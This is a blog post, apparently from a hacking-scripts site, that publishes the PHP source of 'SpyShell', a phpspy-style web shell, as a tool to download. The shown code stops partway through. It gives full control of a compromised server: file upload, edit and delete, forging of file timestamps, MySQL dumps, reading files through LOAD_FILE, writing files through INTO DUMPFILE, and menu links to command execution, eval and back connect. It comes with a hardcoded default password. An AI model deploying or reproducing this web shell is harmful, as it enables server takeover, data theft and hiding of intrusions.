---
id: 248
title: SpyShell Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=248
permalink: /spyshell-script/
categories:
  - PHP
tags:
  - PHP
  - phpspy
  - spyshell
---
SpyShell Script, powered by Security Angel Team [S4T].


### SpyShell Script Source Code

{% highlight php %}<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach($_POST as $key =&gt; $value) {
	if (IS_GPC) {
		$value = s_array($value);
	}
	$$key = $value;
}
/*===================== ³ÌÐòÅäÖÃ =====================*/

//echo encode_pass('angel');exit;
//angel = ec38fe2a8497e0a8d6d349b3533038cb
// Èç¹ûÐèÒªÃÜÂëÑéÖ¤,ÇëÐÞ¸ÄµÇÂ½ÃÜÂë,Áô¿ÕÎª²»ÐèÒªÑéÖ¤
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//ÈçÄú¶Ô cookie ×÷ÓÃ·¶Î§ÓÐÌØÊâÒªÇó, »òµÇÂ¼²»Õý³£, ÇëÐÞ¸ÄÏÂÃæ±äÁ¿, ·ñÔòÇë±£³ÖÄ¬ÈÏ
// cookie Ç°×º
$cookiepre = '';
// cookie ×÷ÓÃÓò
$cookiedomain = '';
// cookie ×÷ÓÃÂ·¾¶
$cookiepath = '/';
// cookie ÓÐÐ§ÆÚ
$cookielife = 86400;

//³ÌÐòËÑË÷¿ÉÐ´ÎÄ¼þµÄÀàÐÍ
!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
/*===================== ÅäÖÃ½áÊø =====================*/

$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
if ($charset == 'utf8') {
	header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
	header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
	header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
	header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euc-kr') {
	header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'euc-jp') {
	header("content-Type: text/html; charset=euc-jp");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== Éí·ÝÑéÖ¤ =====================*/
if ($action == "logout") {
	scookie('loginpass', '', -86400 * 365);
	@header('Location: '.$self);
	exit;
}
if($pass) {
	if ($action == 'login') {
		if ($pass == encode_pass($password)) {
			scookie('loginpass',encode_pass($password));
			@header('Location: '.$self);
			exit;
		}
	}
	if ($_COOKIE['loginpass']) {
		if ($_COOKIE['loginpass'] != $pass) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== ÑéÖ¤½áÊø =====================*/

$errmsg = '';
!$action && $action = 'file';

// ²é¿´PHPINFO
if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
		exit;
	} else {
		$errmsg = 'phpinfo() function has non-permissible';
	}
}

// ÏÂÔØÎÄ¼þ
if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'The file you want Downloadable was nonexistent';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}

// Ö±½ÓÏÂÔØ±¸·ÝÊý¾Ý¿â
if ($doing == 'backupmysql' && !$saveasfile) {
	if (!$table) {
		$errmsg ='Please choose the table';
	} else {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		$filename = basename($dbname.'.sql');
		header('Content-type: application/unknown');
		header('Content-Disposition: attachment; filename='.$filename);
		foreach($table as $k =&gt; $v) {
			if ($v) {
				sqldumptable($v);
			}
		}
		mysql_close();
		exit;
	}
}

// Í¨¹ýMYSQLÏÂÔØÎÄ¼þ
if($doing=='mysqldown'){
	if (!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if (!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_angel;");
				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
				//ÓÃÊ±¼ä´ÁÀ´±íÊ¾½Ø¶Ï,±ÜÃâ³öÏÖ¶ÁÈ¡×ÔÉí»ò°üº¬__angel_1111111111_eof__µÄÎÄ¼þÊ±²»ÍêÕûµÄÇé¿ö
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
				$result = q("select content from tmp_angel");
				q("DROP TABLE tmp_angel");
			}
			$row = @mysql_fetch_array($result);
			if (!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}

?>
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;
&lt;title&gt;<?php echo $action.' - '.$_SERVER['HTTP_HOST'];?>&lt;/title&gt;
&lt;style type="text/css"&gt;
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
&lt;/style&gt;
&lt;script type="text/javascript"&gt;
function CheckAll(form) {
	for(var i=0;i&lt;form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=view_writable;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
function getsize(getdir,dir){
	$('getsize').getdir.value=getdir;
	$('getsize').dir.value=dir;
	$('getsize').submit();
}
function editrecord(action, base64, tablename){
	if (action == 'del') {		
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
function s(action,nowpath,p1,p2,p3,p4,p5) {
	if(action) $('opform').action.value=action;
	if(nowpath) $('opform').nowpath.value=nowpath;
	if(p1) $('opform').p1.value=p1;
	if(p2) $('opform').p2.value=p2;
	if(p3) $('opform').p3.value=p3;
	if(p4) $('opform').p4.value=p4;
	if(p5) $('opform').p4.value=p5;
}
function g(action,nowpath,p1,p2,p3,p4,p5) {
	if(!action) return;
	s(action,nowpath,p1,p2,p3,p4,p5);
	$('opform').submit();
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body style="margin:0;table-layout:fixed; word-break:break-all"&gt;
<?php
formhead(array('name'=&gt;'opform'));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
formfoot();

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(@posix_geteuid());
	$gid = @posix_getgrgid(@posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

?>
&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
	&lt;tr class="head"&gt;
		&lt;td&gt;&lt;span style="float:right;"&gt;<?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?>&lt;/span&gt;<?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)&lt;/td&gt;
	&lt;/tr&gt;
	&lt;tr class="alt1"&gt;
		&lt;td&gt;
			&lt;span style="float:right;"&gt;PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?>&lt;/span&gt;
			&lt;a href="javascript:g('logout');"&gt;Logout&lt;/a&gt; | 
			&lt;a href="javascript:g('file');"&gt;File Manager&lt;/a&gt; | 
			&lt;a href="javascript:g('mysqladmin');"&gt;MYSQL Manager&lt;/a&gt; | 
			&lt;a href="javascript:g('sqlfile');"&gt;MySQL Upload &amp; Download&lt;/a&gt; | 
			&lt;a href="javascript:g('shell');"&gt;Execute Command&lt;/a&gt; | 
			&lt;a href="javascript:g('phpenv');"&gt;PHP Variable&lt;/a&gt; | 
			&lt;a href="javascript:g('portscan');"&gt;Port Scan&lt;/a&gt; | 
			&lt;a href="javascript:g('secinfo');"&gt;Security information&lt;/a&gt; | 
			&lt;a href="javascript:g('eval');"&gt;Eval PHP Code&lt;/a&gt;
			<?php if (!IS_WIN) {?> | &lt;a href="javascript:g('backconnect');"&gt;Back Connect&lt;/a&gt;<?php }?>
		&lt;/td&gt;
	&lt;/tr&gt;
&lt;/table&gt;
&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
<?php
$errmsg && m($errmsg);

// »ñÈ¡µ±Ç°Â·¾¶
if (!$dir) {
	$dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
	$dir = $dir.'/';
}

if ($action == 'file') {

	// ÅÐ¶Ï¶ÁÐ´Çé¿ö
	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

	// ´´½¨Ä¿Â¼
	if ($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if (file_exists($mkdirs)) {
			m('Directory has already existed');
		} else {
			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
			@chmod($mkdirs,0777);
		}
	}

	// ÉÏ´«ÎÄ¼þ
	elseif ($doupfile) {
		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
	}

	// ±à¼­ÎÄ¼þ
	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
		@fclose($fp);
	}

	// ±à¼­ÎÄ¼þÊôÐÔ
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('The original file does not exist');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
		}
	}

	// ¸ÄÃû
	elseif ($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if (file_exists($nname) || !file_exists($oldname)) {
			m($nname.' has already existed or original file does not exist');
		} else {
			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}

	// ¸´ÖÆÎÄ¼þ
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
		}
	}

	// ¿ËÂ¡Ê±¼ä
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			$time = @filemtime($tarfile);
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// ×Ô¶¨ÒåÊ±¼ä
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' does not exist');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// ÅúÁ¿É¾³ýÎÄ¼þ
	elseif($doing == 'delfiles') {
		if ($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath) {
				if (is_dir($filepath)) {
					if (@deltree($filepath)) {
						$succ++;
					} else {
						$fail++;
					}
				} else {
					if (@unlink($filepath)) {
						$succ++;
					} else {
						$fail++;
					}
				}
			}
			m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select folder/file(s)');
		}
	}

	//²Ù×÷Íê±Ï
	formhead(array('name'=&gt;'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=&gt;'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=&gt;'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=&gt;'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=&gt;'fileopform', 'target'=&gt;'_blank'));
	makehide('action');
	makehide('opfile');
	makehide('dir');
	formfoot();
	formhead(array('name'=&gt;'getsize'));
	makehide('getdir');
	makehide('dir');
	formfoot();

	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	p('&lt;h2&gt;File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)&lt;/h2&gt;');

	$cwd_links = '';
	$path = explode('/', $nowpath);
	$n=count($path);
	for($i=0;$i&lt;$n-1;$i++) {
		$cwd_links .= '&lt;a href="javascript:godir(\'';
		for($j=0;$j&lt;=$i;$j++) {
			$cwd_links .= $path[$j].'/';
		}
		$cwd_links .= '\');"&gt;'.$path[$i].'/&lt;/a&gt;';
	}

?>
&lt;script type="text/javascript"&gt;
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$('inputnav').style.display = "";
			$('pathnav').style.display = "none";
			//hidenav();
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$('inputnav').style.display = "none";
	$('pathnav').style.display = "";
}
&lt;/script&gt;
&lt;div style="background:#eee;margin-bottom:10px;"&gt;
	&lt;table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0"&gt;
		&lt;tr&gt;
			&lt;td width="100%"&gt;<?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)&lt;/td&gt;
			&lt;td nowrap&gt;&lt;input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"&gt;&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/table&gt;
	&lt;table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;"&gt;
	&lt;form action="" method="post" id="godir" name="godir"&gt;
		&lt;tr&gt;
			&lt;td nowrap&gt;Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)&lt;/td&gt;
			&lt;td width="100%"&gt;&lt;input name="view_writable" value="0" type="hidden" /&gt;&lt;input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"&gt;&lt;/td&gt;
			&lt;td nowrap&gt;&lt;input class="bt" value="GO" type="submit"&gt;&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/form&gt;
	&lt;/table&gt;
<?php
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj) && $obj-&gt;Drives) {
			echo '&lt;div class="drives"&gt;';
			$DriveTypeDB = array(0 =&gt; 'Unknow',1 =&gt; 'Removable',2 =&gt; 'Fixed',3 =&gt; 'Network',4 =&gt; 'CDRom',5 =&gt; 'RAM Disk');
			$comma = '';
			foreach($obj-&gt;Drives as $drive) {
				if ($drive-&gt;Path) {
					p($comma.'&lt;a href="javascript:godir(\''.$drive-&gt;Path.'/\');"&gt;'.$DriveTypeDB[$drive-&gt;DriveType].'('.$drive-&gt;Path.')&lt;/a&gt;');
					$comma = '&lt;span&gt;|&lt;/span&gt;';
				}
			}
			echo '&lt;/div&gt;';
		}
	}
?>
&lt;/div&gt;
<?php
	$findstr = $_POST['findstr'];
	$re = $_POST['re'];
	tbhead();
	p('&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;');
	p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data"&gt;&lt;div style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'.$nowpath.'" type="hidden" /&gt;&lt;input name="dir" value="'.$nowpath.'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;');
	p('&lt;a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');"&gt;WebRoot&lt;/a&gt;');
	p(' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;');
	p(' | &lt;a href="javascript:godir(\''.$nowpath.'\');"&gt;View All&lt;/a&gt;');
	p(' | View Writable ( &lt;a href="javascript:godir(\''.$nowpath.'\',\'dir\');"&gt;Directory&lt;/a&gt;');
	p(' | &lt;a href="javascript:godir(\''.$nowpath.'\',\'file\');"&gt;File&lt;/a&gt; )');
	p(' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="javascript:createfile(\''.$nowpath.'\');"&gt;Create File&lt;/a&gt;');

	p('&lt;div style="padding:5px 0;"&gt;&lt;form action="'.$self.'" method="POST"&gt;Find string in files(current folder): &lt;input class="input" name="findstr" value="'.$findstr.'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'.$writabledb.'" type="text" /&gt;&lt;input name="dir" value="'.$dir.'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;');

	p('&lt;tr class="head"&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');

	//²é¿´ËùÓÐ¿ÉÐ´ÎÄ¼þºÍÄ¿Â¼
	$dirdata=array();
	$filedata=array();

	if ($view_writable == 'dir') {
		$dirdata = GetWDirList($nowpath);
		$filedata = array();
	} elseif ($view_writable == 'file') {
		$dirdata = array();
		$filedata = GetWFileList($nowpath);
	} elseif ($findstr) {
		$dirdata = array();
		$filedata = GetSFileList($nowpath, $findstr, $re);
	} else {
		// Ä¿Â¼ÁÐ±í
		//scandir()Ð§ÂÊ¸ü¸ß
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdata[]=$dirdb;
			} else {		
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedata[]=$filedb;
			}
		}// while
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';

	p('&lt;form id="filelist" name="filelist" action="'.$self.'" method="post"&gt;');
	makehide('action','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);

	foreach($dirdata as $key =&gt; $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			if($getdir && $getdir == $dirdb['server_link']) {
				$attachsize = dirsize($dirdb['server_link']);
				$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
			} else {
				$attachsize = '&lt;a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');"&gt;Stat&lt;/a&gt;';
			}
			$thisbg = bg();
			p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
			p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"&gt;&lt;/td&gt;');
			p('&lt;td&gt;&lt;a href="javascript:godir(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['filename'].'&lt;/a&gt;&lt;/td&gt;');
			p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');"&gt;'.$dirdb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
			p('&lt;td nowrap&gt;'.$attachsize.'&lt;/td&gt;');
			p('&lt;td nowrap&gt;');
			p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirchmod'].'&lt;/a&gt; / ');
			p('&lt;a href="javascript:fileperm(\''.$dirdb['server_link'].'\');"&gt;'.$dirdb['dirperm'].'&lt;/a&gt;'.$dirdb['fileowner'].'&lt;/td&gt;');
			p('&lt;td nowrap&gt;&lt;a href="javascript:rename(\''.$dirdb['server_link'].'\');"&gt;Rename&lt;/a&gt;&lt;/td&gt;');
			p('&lt;/tr&gt;');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('&lt;tr class='.bg().'&gt;');
				p('&lt;td align="center"&gt;-&lt;/td&gt;&lt;td nowrap colspan="5"&gt;&lt;a href="javascript:godir(\''.getUpPath($nowpath).'\');"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;');
				p('&lt;/tr&gt;');
			}
		}
	}

	p('&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;');
	$file_i = '0';

	foreach($filedata as $key =&gt; $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
			$thisbg = bg();
			p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
			p('&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"&gt;&lt;/td&gt;');
			p('&lt;td&gt;'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '&lt;a href="'.$fileurl.'" target="_blank"&gt;'.$filedb['filename'].'&lt;/a&gt;' : $filedb['filename']).'&lt;/td&gt;');
			p('&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;'.$filedb['mtime'].'&lt;/a&gt;&lt;/td&gt;');
			p('&lt;td nowrap&gt;'.$filedb['size'].'&lt;/td&gt;');
			p('&lt;td nowrap&gt;');
			p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['filechmod'].'&lt;/a&gt; / ');
			p('&lt;a href="javascript:fileperm(\''.$filedb['server_link'].'\');"&gt;'.$filedb['fileperm'].'&lt;/a&gt;'.$filedb['fileowner'].'&lt;/td&gt;');
			p('&lt;td nowrap&gt;');
			p('&lt;a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');"&gt;Down&lt;/a&gt; | ');
			p('&lt;a href="javascript:copyfile(\''.$filedb['server_link'].'\');"&gt;Copy&lt;/a&gt; | ');
			p('&lt;a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');"&gt;Edit&lt;/a&gt; | ');
			p('&lt;a href="javascript:rename(\''.$filedb['server_link'].'\');"&gt;Rename&lt;/a&gt;');
			p('&lt;/td&gt;&lt;/tr&gt;');
			$file_i++;
		}
	}
	p('&lt;tr class="head"&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last modified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;');
	p('&lt;tr class="'.bg().'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'.$dir_i.' directories / '.$file_i.' files&lt;/td&gt;&lt;/tr&gt;');
	p('&lt;/form&gt;&lt;/table&gt;');
}// end dir

elseif ($action == 'sqlfile') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if (file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
